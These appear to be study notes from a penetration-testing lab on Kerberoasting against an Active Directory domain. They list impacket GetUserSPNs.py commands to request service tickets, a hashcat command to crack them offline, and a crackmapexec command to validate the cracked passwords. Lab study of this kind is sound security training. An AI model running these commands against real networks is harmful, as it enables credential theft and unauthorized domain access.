- For this session of enumeration, this needs to happen from an internal host: Web Server Shell, SSH User/Root keys

- Need to install impacket tools on to Victim Host, or SCP the tools over, or even proxychains scan

- GetUserSPNs.py -dc-ip <targetedDC_IPaddr> INLANEFREIGHT.LOCAL/forend <validatedDCuser> -request
		- this example syntax will pull all TGS tickets

- GetUserSPNs.py -dc-ip <targetedDC_IPaddr> INLANEFREIGHT.LOCAL/forend <validatedDCuser> -request-user <user results from initial scan to grab their ticket>

- GetUserSPNs.py -dc-ip <targetedDC_IPaddr> INLANEFREIGHT.LOCAL/forend <validatedDCuser> -request-user <targetedUser> -outputfile <tgs name for offline cracking>

- hashcat -m 13100 <hashcat value for Kerberos> <file with TGS> /usr/share/wordlists/rockyou.txt

- sudo crackmapexec smb <DC_IP> -u <user targeted> -p <cracked password> 
	- This will validate if the login attempt worked